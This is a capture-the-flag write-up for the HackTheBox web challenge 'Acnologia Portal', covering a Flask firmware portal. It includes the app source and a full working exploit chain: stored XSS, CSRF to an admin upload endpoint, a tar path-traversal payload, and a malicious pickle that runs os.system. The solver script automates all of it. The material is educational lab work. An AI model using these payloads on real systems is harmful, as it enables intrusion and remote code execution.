---
Category:
  - Web
Difficulty: Medium
Platform: HackTheBox
Status: 3. Complete
tags:
  - XSS
  - exploit-chain
  - flask
  - pickle-deserialization
  - zip-slip
  - CSRF
---
>[!quote]
> *Bonnie has confirmed the location of the Acnologia spacecraft operated by the Golden Fang mercenary. Before taking over the spaceship, we need to disable its security measures. Ulysses discovered an accessible firmware management portal for the spacecraft. Can you help him get in?*****

# Set up

- **Dockerfile**
    
    ```bash
    FROM python:3-alpine
    
    # Install packages
    RUN apk add --update --no-cache supervisor chromium chromium-chromedriver gcc musl-dev libffi-dev
    
    # Upgrade pip
    RUN python -m pip install --upgrade pip
    
    # Install dependencies
    RUN pip install selenium Flask Flask-Session Flask-SQLAlchemy SQLAlchemy-serializer Flask-Login
    
    # Copy flag
    COPY flag.txt /flag.txt
    
    # add user
    RUN adduser -D -u 1000 -g 1000 -s /bin/sh www
    
    # Setup app
    RUN mkdir -p /app
    
    # Switch working environment
    WORKDIR /app
    
    # Add application
    COPY challenge .
    RUN chown -R www: /app
    
    # Setup supervisor
    COPY config/supervisord.conf /etc/supervisord.conf
    
    # Expose port the server is reachable on
    EXPOSE 1337
    
    # Disable pycache
    ENV PYTHONDONTWRITEBYTECODE=1
    
    # Run supervisord
    CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
    ```
    
- **build-docker.sh**
    
    ```bash
    #!/bin/bash
    docker rm -f web_acnologia_portal
    docker build --tag=web_acnologia_portal .
    docker run -p 1337:1337 --rm --name=web_acnologia_portal web_acnologia_portal
    ```
    

# Information Gathering

## Application Overview

Login page (*registration page is equal*):

![Acnologia%20Portal%2058cbcbc3190343438e873a789c8ccc4a](../../zzz_res/attachments/Acnologia%20Portal%2058cbcbc3190343438e873a789c8ccc4a.png)

Dashboard:

![Acnologia%20Portal%2058cbcbc3190343438e873a789c8ccc4a](../../zzz_res/attachments/Acnologia%20Portal%2058cbcbc3190343438e873a789c8ccc4a%201.png)

Report a bug:

![* Issue reported successfully!](../../zzz_res/attachments/Acnologia%20Portal%2058cbcbc3190343438e873a789c8ccc4a%202.png)

* Issue reported successfully!

## Source code

- **run.py**
    
    ```python
    from application.main import app
    from application.database import migrate_db
    
    with app.app_context():
        migrate_db()
    
    app.run(host='0.0.0.0', port=1337, debug=False, use_evalex=False)
    ```
    
- **main.py**
    
    ```python
    from flask import Flask
    from application.blueprints.routes import web, api, response
    from application.database import db, User
    from flask_login import LoginManager
    from flask_session import Session
    
    app = Flask(__name__)
    app.config.from_object('application.config.Config')
    db.init_app(app)
    db.create_all(app=app)
    login_manager = LoginManager()
    login_manager.init_app(app)
    sess = Session()
    sess.init_app(app)
    
    app.register_blueprint(web, url_prefix='/')
    app.register_blueprint(api, url_prefix='/api')
    
    @login_manager.user_loader
    def load_user(user_id):
        return User.query.get(int(user_id))
    
    @app.errorhandler(404)
    def not_found(error):
        return response('404 Not Found'), 404
    
    @app.errorhandler(403)
    def forbidden(error):
        return response('403 Forbidden'), 403
    
    @app.errorhandler(400)
    def bad_request(error):
        return response('400 Bad Request'), 400
    ```
    
- **routes.py**
    
    ```python
    import json
    from application.database import User, Firmware, Report, db, migrate_db
    from application.util import is_admin, extract_firmware
    from flask import Blueprint, jsonify, redirect, render_template, request
    from flask_login import current_user, login_required, login_user, logout_user
    from application.bot import visit_report
    
    web = Blueprint('web', __name__)
    api = Blueprint('api', __name__)
    
    def response(message):
        return jsonify({'message': message})
    
    @web.route('/', methods=['GET'])
    def login():
        return render_template('login.html')
    
    @api.route('/login', methods=['POST'])
    def user_login():
        if not request.is_json:
            return response('Missing required parameters!'), 401
    
        data = request.get_json()
        username = data.get('username', '')
        password = data.get('password', '')
    
        if not username or not password:
            return response('Missing required parameters!'), 401
    
        user = User.query.filter_by(username=username).first()
    
        if not user or not user.password == password:
            return response('Invalid username or password!'), 403
    
        login_user(user)
        return response('User authenticated successfully!')
    
    @web.route('/register', methods=['GET'])
    def register():
        return render_template('register.html')
    
    @api.route('/register', methods=['POST'])
    def user_registration():
        if not request.is_json:
            return response('Missing required parameters!'), 401
    
        data = request.get_json()
        username = data.get('username', '')
        password = data.get('password', '')
    
        if not username or not password:
            return response('Missing required parameters!'), 401
    
        user = User.query.filter_by(username=username).first()
    
        if user:
            return response('User already exists!'), 401
    
        new_user = User(username=username, password=password)
        db.session.add(new_user)
        db.session.commit()
    
        return response('User registered successfully!')
    
    @web.route('/dashboard')
    @login_required
    def dashboard():
        return render_template('dashboard.html')
    
    @api.route('/firmware/list', methods=['GET'])
    @login_required
    def firmware_list():
        firmware_list = Firmware.query.all()
        return jsonify([row.to_dict() for row in firmware_list])
    
    @api.route('/firmware/report', methods=['POST'])
    @login_required
    def report_issue():
        if not request.is_json:
            return response('Missing required parameters!'), 401
    
        data = request.get_json()
        module_id = data.get('module_id', '')
        issue = data.get('issue', '')
    
        if not module_id or not issue:
            return response('Missing required parameters!'), 401
    
        new_report = Report(module_id=module_id, issue=issue, reported_by=current_user.username)
        db.session.add(new_report)
        db.session.commit()
    
        visit_report()
        migrate_db()
    
        return response('Issue reported successfully!')
    
    @api.route('/firmware/upload', methods=['POST'])
    @login_required
    @is_admin
    def firmware_update():
        if 'file' not in request.files:
            return response('Missing required parameters!'), 401
    
        extraction = extract_firmware(request.files['file'])
        if extraction:
            return response('Firmware update initialized successfully.')
    
        return response('Something went wrong, please try again!'), 403
    
    @web.route('/review', methods=['GET'])
    @login_required
    @is_admin
    def review_report():
        Reports = Report.query.all()
        return render_template('review.html', reports=Reports)
    
    @web.route('/logout')
    @login_required
    def logout():
        logout_user()
        return redirect('/')
    ```
    
- **database.py**
    
    ```python
    from flask_sqlalchemy import SQLAlchemy
    from sqlalchemy_serializer import SerializerMixin
    from flask_login import UserMixin
    from flask import current_app
    
    db = SQLAlchemy()
    
    class User(db.Model, UserMixin):
        id = db.Column(db.Integer, primary_key=True)
        username = db.Column(db.String(100), unique=True)
        password = db.Column(db.String(100))
    
    class Firmware(db.Model, UserMixin, SerializerMixin):
        id = db.Column(db.Integer, primary_key=True)
        module = db.Column(db.String(100))
        hw_version = db.Column(db.String(100))
        fw_version = db.Column(db.String(100))
        serial = db.Column(db.String(100))
        hub_id = db.Column(db.String(100))
    
    class Report(db.Model, UserMixin, SerializerMixin):
        id = db.Column(db.Integer, primary_key=True)
        module_id = db.Column(db.Integer)
        reported_by = db.Column(db.String(100))
        issue = db.Column(db.Text)
    
    def clear_reports():
        db.session.query(Report).delete()
        db.session.commit()
    
    def clear_db():
        meta = db.metadata
        for table in reversed(meta.sorted_tables):
            db.session.execute(table.delete())
        db.session.commit()
    
    def migrate_db():
        clear_db()
        # admin user
        db.session.add(User(id=1, username=current_app.config['ADMIN_USERNAME'], password=current_app.config['ADMIN_PASSWORD']))
    
        # firmwares
        db.session.add(Firmware(id=1, module='Launch pod interface', hw_version='d3', fw_version='2408.b', serial='c6c3b20e', hub_id='17310'))
        db.session.add(Firmware(id=2, module='Oxidizer controller', hw_version='a4', fw_version='1801.c', serial='b20418fc', hub_id='33194'))
        db.session.add(Firmware(id=3, module='Propellant damper', hw_version='b6', fw_version='1705.e', serial='7fdee87d', hub_id='19696'))
        db.session.add(Firmware(id=4, module='RD-983 compressor', hw_version='a1', fw_version='0002.a', serial='b0dae2e3', hub_id='91284'))
        db.session.add(Firmware(id=5, module='Refinery interface', hw_version='g4', fw_version='4323.d', serial='d0f2798d', hub_id='31157'))
        db.session.add(Firmware(id=6, module='Condensation chamber', hw_version='k3', fw_version='3467.p', serial='2e1e7897', hub_id='19850'))
        db.session.add(Firmware(id=7, module='Fission reactor', hw_version='p3', fw_version='9031.g', serial='9c431d03', hub_id='12488'))
        db.session.add(Firmware(id=8, module='Booster core', hw_version='i7', fw_version='7651.g', serial='cd003b79', hub_id='12488'))
        db.session.add(Firmware(id=9, module='Surface calibrator', hw_version='a1', fw_version='4632.g', serial='b320babd', hub_id='14274'))
        db.session.add(Firmware(id=10, module='Nozzle controller', hw_version='f6', fw_version='8731.g', serial='8be939d9', hub_id='78804'))
    
        db.session.commit()
    ```
    
- **config.py**
    
    ```python
    from application.util import generate
    import os
    
    class Config(object):
        SECRET_KEY = generate(50)
        UPLOAD_FOLDER = f'{os.getcwd()}/application/static/firmware_extract'
        ADMIN_USERNAME = 'admin'
        ADMIN_PASSWORD = generate(15)
        SESSION_PERMANENT = False
        SESSION_TYPE = 'filesystem'
        SESSION_KEY_PREFIX = ''
        SESSION_FILE_THRESHOLD = 20
        SESSION_USE_SIGNER = False
        SQLALCHEMY_DATABASE_URI = 'sqlite:///database.db'
        SQLALCHEMY_TRACK_MODIFICATIONS = False
    
    class ProductionConfig(Config):
        pass
    
    class DevelopmentConfig(Config):
        DEBUG = True
    
    class TestingConfig(Config):
        TESTING = True
    ```
    
- **bot.py**
    
    ```python
    from selenium import webdriver
    from flask import current_app
    import time
    
    def visit_report():
        chrome_options = webdriver.ChromeOptions()
    
        chrome_options.add_argument('--headless')
        chrome_options.add_argument("--incognito")
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-setuid-sandbox')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-background-networking')
        chrome_options.add_argument('--disable-extensions')
        chrome_options.add_argument('--disable-sync')
        chrome_options.add_argument('--disable-translate')
        chrome_options.add_argument('--metrics-recording-only')
        chrome_options.add_argument('--mute-audio')
        chrome_options.add_argument('--no-first-run')
        chrome_options.add_argument('--safebrowsing-disable-auto-update')
        chrome_options.add_argument('--js-flags=--noexpose_wasm,--jitless')
    
        client = webdriver.Chrome(chrome_options=chrome_options)
        client.set_page_load_timeout(5)
        client.set_script_timeout(5)
    
        client.get('http://localhost:1337/')
    
        username = client.find_element_by_id('username')
        password = client.find_element_by_id('password')
        login = client.find_element_by_id('login-btn')
    
        username.send_keys(current_app.config['ADMIN_USERNAME'])
        password.send_keys(current_app.config['ADMIN_PASSWORD'])
        login.click()
        time.sleep(3)
    
        client.get('http://localhost:1337/review')
    
        time.sleep(3)
        client.quit()
    ```
    
- **util.py**
    
    ```python
    import functools, tarfile, tempfile, os
    from flask_login import current_user
    from flask import current_app, abort, request
    
    generate = lambda x: os.urandom(x).hex()
    
    def is_admin(f):
        @functools.wraps(f)
        def wrap(*args, **kwargs):
            if current_user.username == current_app.config['ADMIN_USERNAME'] and request.remote_addr == '127.0.0.1':
                return f(*args, **kwargs)
            else:
                return abort(401)
    
        return wrap
    
    def extract_firmware(file):
        tmp  = tempfile.gettempdir()
        path = os.path.join(tmp, file.filename)
        file.save(path)
    
        if tarfile.is_tarfile(path):
            tar = tarfile.open(path, 'r:gz')
            tar.extractall(tmp)
    
            rand_dir = generate(15)
            extractdir = f"{current_app.config['UPLOAD_FOLDER']}/{rand_dir}"
            os.makedirs(extractdir, exist_ok=True)
            for tarinfo in tar:
                name = tarinfo.name
                if tarinfo.isreg():
                    try:
                        filename = f'{extractdir}/{name}'
                        os.rename(os.path.join(tmp, name), filename)
                        continue
                    except:
                        pass
                os.makedirs(f'{extractdir}/{name}', exist_ok=True)
            tar.close()
            return True
    
        return False
    ```
    

# The Bug

## XSS

![Acnologia%20Portal%2058cbcbc3190343438e873a789c8ccc4a](../../zzz_res/attachments/Acnologia%20Portal%2058cbcbc3190343438e873a789c8ccc4a%203.png)

```python
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Firmware bug reports</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet" />
  </head>
  <body>
    <nav class="navbar navbar-default bg-dark justify-content-between">
      <a class="navbar-brand ps-3" href="#">Firmware bug reports</a>
      <ul class="navbar-nav mb-2 mb-lg-0 me-5">
        <li class="nav-item">
          <a class="nav-item active" href="#">Reports</a>
        </li>
        <li class="nav-item">
          <a class="nav-item" href="/logout">Logout</a>
        </li>
      </ul>
    </nav>
    <div class="container" style="margin-top: 20px"> {% for report in reports %} <div class="card">
        <div class="card-header"> Reported by : {{ report.reported_by }}
        </div>
        <div class="card-body">
        <p class="card-title">Module ID : {{ report.module_id }}</p>
          <p class="card-text">Issue : {{ report.issue | safe }} </p>
          <a href="#" class="btn btn-primary">Reply</a>
          <a href="#" class="btn btn-danger">Delete</a>
        </div>
      </div> {% endfor %} </div>
  </body>
</html>
```

```python
...
@web.route('/review', methods=['GET'])
@login_required
@is_admin
def review_report():
    Reports = Report.query.all()
    return render_template('review.html', reports=Reports)
...
```

## Cross Site Request Forgery

Using XSS I can force the bot to perform an arbitrary request to `/firmware/upload` and upload arbitrary files

## Zip Slip

Application extract arbitrary tar file without validating. It’s is possible to replace and overwrite arbitrary files on the system.

```python
...
def extract_firmware(file):
    tmp  = tempfile.gettempdir()
    path = os.path.join(tmp, file.filename)
    file.save(path)

    if tarfile.is_tarfile(path):
        tar = tarfile.open(path, 'r:gz')
        tar.extractall(tmp)

        rand_dir = generate(15)
        extractdir = f"{current_app.config['UPLOAD_FOLDER']}/{rand_dir}"
        os.makedirs(extractdir, exist_ok=True)
        for tarinfo in tar:
            name = tarinfo.name
            if tarinfo.isreg():
                try:
                    filename = f'{extractdir}/{name}'
                    os.rename(os.path.join(tmp, name), filename)
                    continue
                except:
                    pass
            os.makedirs(f'{extractdir}/{name}', exist_ok=True)
        tar.close()
        return True

    return False
...
```

## Flask-Session cookie Pickle deserialization

If we launch the challenge application locally and inspect the `/app` directory, we will see that we don't have permission to write or modify any files in the `application` directory. However, the `flask_session` directory is owned by the `www` user, where we can create arbitrary files:

```bash
drwxrwxr-x    5 root     root          4096 May  9 16:28 application
drwxrwxr-x    1 www      www           4096 May 17 21:54 flask_session
-rw-rw-r--    1 root     root           185 May  9 16:28 run.py
```

Looking into the `application/config.py` file, we can see a few config keys related to the flask-session library:

```bash
SESSION_PERMANENT = False
SESSION_TYPE = 'filesystem'
SESSION_KEY_PREFIX = ''
SESSION_FILE_THRESHOLD = 20
SESSION_USE_SIGNER = False
```

From the flask-session [documentation](https://flask-session.readthedocs.io/en/latest/), the `SESSION_USE_SIGNER` key is described as follows:

> [!quote]
> *Whether sign the session cookie sid or not, if set to True, you have to set flask.Flask.secret_key, default to be False*


Since the `SESSION_TYPE` is set to `filesystem`, whenever we log in to the application, a new session file is created in the `/app/flask_session` folder. The filename is calculated as the **MD5** hash of the session cookie sid. If we look at the source code of the flask-session library, we'll see the `filesystem` session type uses the class [FileSystemSessionInterface](https://github.com/fengsp/flask-session/blob/9f591b5c7ecf25c44678c7d18d94a0bf91132e2d/flask_session/sessions.py#L302):

```python
class FileSystemSessionInterface(SessionInterface):
   """Uses the :class:`cachelib.file.FileSystemCache` as a session backend.
   .. versionadded:: 0.2
       The `use_signer` parameter was added.
   :param cache_dir: the directory where session files are stored.
   :param threshold: the maximum number of items the session stores before it
                       starts deleting some.
   :param mode: the file mode wanted for the session files, default 0600
   :param key_prefix: A prefix that is added to FileSystemCache store keys.
   :param use_signer: Whether to sign the session id cookie or not.
   :param permanent: Whether to use permanent session or not.
   """
 
   session_class = FileSystemSession
```

The `FileSystemCache` class from the `cachelib` library saves the session where the supplied key is `SESSION_KEY_PREFIX` appended with the session `sid` value. Looking into the [FileSystemCache](https://github.com/pallets-eco/cachelib/blob/154a616fb6acb900bece437f792ee3df580cb4e9/src/cachelib/file.py#L18) class:

```python
class FileSystemCache(BaseCache):
   """A cache that stores the items on the file system.  This cache depends
   on being the only user of the `cache_dir`.  Make absolutely sure that
   nobody but this cache stores files there or otherwise the cache will
   randomly delete files therein.
   :param cache_dir: the directory where cache files are stored.
   :param threshold: the maximum number of items the cache stores before
                     it starts deleting some. A threshold value of 0
                     indicates no threshold.
   :param default_timeout: the default timeout that is used if no timeout is
                           specified on :meth:`~BaseCache.set`. A timeout of
                           0 indicates that the cache never expires.
   :param mode: the file mode wanted for the cache files, default 0600
   :param hash_method: Default hashlib.md5. The hash method used to
                       generate the filename for cached results.
```

The default `hash_method` used to generate the filename is **MD5**. 

So, if we provide a session cookie "session=ABC123" in our HTTP request, the application looks for the session file at `/app/flask_session/MD5(ABC123)` by default. The second thing to notice from this class is that the `serializer` used to save and load the data from the files is acquired by calling the [FileSystemSerializer()](https://github.com/pallets-eco/cachelib/blob/154a616fb6acb900bece437f792ee3df580cb4e9/src/cachelib/serializers.py#L75) class:

```python
class BaseSerializer:
   """This is the base interface for all default serializers.
   BaseSerializer.load and BaseSerializer.dump will
   default to pickle.load and pickle.dump. This is currently
   used only by FileSystemCache which dumps/loads to/from a file stream.
   """
 
   def _warn(self, e: pickle.PickleError) -> None:
       logging.warning(
           f"An exception has been raised during a pickling operation: {e}"
       )
 
   def dump(
       self, value: int, f: _t.IO, protocol: int = pickle.HIGHEST_PROTOCOL
   ) -> None:
       try:
           pickle.dump(value, f, protocol)
       except (pickle.PickleError, pickle.PicklingError) as e:
           self._warn(e)
 
   def load(self, f: _t.BinaryIO) -> _t.Any:
       try:
           data = pickle.load(f)
       except pickle.PickleError as e:
           self._warn(e)
           return None
       else:
           return data
 
   """BaseSerializer.loads and BaseSerializer.dumps
   work on top of pickle.loads and pickle.dumps. Dumping/loading
   strings and byte strings is the default for most cache types.
   """
 
   def dumps(self, value: _t.Any, protocol: int = pickle.HIGHEST_PROTOCOL) -> bytes:
       try:
           serialized = pickle.dumps(value, protocol)
       except (pickle.PickleError, pickle.PicklingError) as e:
           self._warn(e)
       return serialized
 
   def loads(self, bvalue: bytes) -> _t.Any:
       try:
           data = pickle.loads(bvalue)
       except pickle.PickleError as e:
           self._warn(e)
           return None
       else:
           return data
<snip>
class FileSystemSerializer(BaseSerializer):
   """Default serializer for FileSystemCache."""
```

If we go back to the `FileSystemCache` class, on line 191, the `FileSystemCache.get()` method is defined that reads the file from the disk and checks the first four bytes of the file data. If the check is passed, the file content is deserialized with `self.serializer.load()` method:

```python
def get(self, key: str) -> _t.Any:
   filename = self._get_filename(key)
   try:
       with self._safe_stream_open(filename, "rb") as f:
           pickle_time = struct.unpack("I", f.read(4))[0]
           if pickle_time == 0 or pickle_time >= time():
               return self.serializer.load(f)
   except FileNotFoundError:
       pass
   except (OSError, EOFError, struct.error):
       logging.warning(
           "Exception raised while handling cache file '%s'",
           filename,
           exc_info=True,
       )
   return None
```

We can read from the Pickle documentation that insecure deserialization can lead to remote code execution. To pass the four-bytes check, we can prepend four bytes of zeros before the serialized pickle payload:

```python
def __reduce__(self):
    cmd = ('/readflag > /app/application/static/flag.txt')
    return os.system, (cmd,)
pickle_time = struct.pack("I", 0000)
pickled_payload = pickle_time + pickle.dumps(RCE())
```

Here's how to create the Zip Slip archive with the Pickle payload in Python:

```python
zipslip = io.BytesIO()
tar = tarfile.open(fileobj=zipslip, mode='w:gz')
info = tarfile.TarInfo(f'../../../../../app/flask_session/{filename}')
info.mtime = time.time()
info.size = len(pickled_payload)
tar.addfile(info, io.BytesIO(pickled_payload))
tar.close()
```

# Exploitation

We'll use the cross-site scripting vulnerability to perform CSRF on the `/api/firmware/upload` endpoint to upload the Zip Slip payload for extraction. The extraction will place the pickle serialized RCE payload in the `flask_session` directory. Finally, we'll trigger the deserialization by visiting the application with a session cookie sid that matches the md5 filename of the payload. Here's the full-chain solver script:

```python
#!/usr/bin/env python3
import sys, requests, base64, time, tarfile, io, os, pickle, hashlib, struct

hostURL = 'http://127.0.0.1:1337'               # Challenge host URL
userName = f'rh0x01'                            # new username
userPwd = f'rh0x01'                             # new password

def register():
    jData = { 'username': userName, 'password': userPwd }
    req_stat = requests.post(f'{hostURL}/api/register', json=jData).status_code
    if not req_stat == 200:
        print("Something went wrong! Is the challenge host live?")
        sys.exit()

def login():
    jData = { 'username': userName, 'password': userPwd }
    authCookie = requests.post(f'{hostURL}/api/login', json=jData).cookies.get('session')
    if not authCookie:
        print("Something went wrong while logging in!")
        sys.exit()
    return authCookie

def prepare_zipslip(filename):
    class RCE:
        def __reduce__(self):
            cmd = ('/readflag > /app/application/static/flag.txt')
            return os.system, (cmd,)
    pickle_time = struct.pack("I", 0000)
    pickled_payload = pickle_time + pickle.dumps(RCE())

    zipslip = io.BytesIO()
    tar = tarfile.open(fileobj=zipslip, mode='w:gz')
    info = tarfile.TarInfo(f'../../../../../app/flask_session/{filename}')
    info.mtime = time.time()
    info.size = len(pickled_payload)
    tar.addfile(info, io.BytesIO(pickled_payload))
    tar.close()

    return base64.b64encode(zipslip.getvalue()).decode()

print('[+] Signing up a new account..')
register()

print('[~] Logging in to acquire session cookie..')
cookie = login()

print('[+] Preparing zipslip payload file with matching cookie sid..')
sid = 'rayhan0x01'
filename = hashlib.md5(sid.encode()).hexdigest()
b64_file = prepare_zipslip(filename)

print('[+] Preparing the XSS payload to upload the zipslip..')
xss_payload = """
<script>
const b64Data="%s"
const byteCharacters = atob(b64Data);
const byteArrays = [];
const sliceSize=512;
const contentType='multipart/form-data';
for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
const slice = byteCharacters.slice(offset, offset + sliceSize);

const byteNumbers = new Array(slice.length);
for (let i = 0; i < slice.length; i++) {
byteNumbers[i] = slice.charCodeAt(i);
}

const byteArray = new Uint8Array(byteNumbers);
byteArrays.push(byteArray);
}

const blob = new Blob(byteArrays, {type: contentType});

var formData = new FormData();
formData.append('file', blob, 'rh0x01.tar.gz');

var xhr = new XMLHttpRequest();
xhr.open('POST','/api/firmware/upload', true);
xhr.send(formData);
</script>
""" % b64_file

print('[+] Sending bug report with XSS payload..')
requests.post(
    f'{hostURL}/api/firmware/report',
    cookies={"session": cookie},
    json={'module_id': 1, 'issue': xss_payload}
)

print('[+] Triggering Pickle rce..')
requests.get(f'{hostURL}/dashboard',cookies={"session": sid})

flag = ''
while not flag:
    flag_resp = requests.get(f'{hostURL}/static/flag.txt')
    if flag_resp.status_code == 200:
        flag = flag_resp.text
    time.sleep(5)

print(f'[+] Flag: {flag}')
```

# Flag

N/A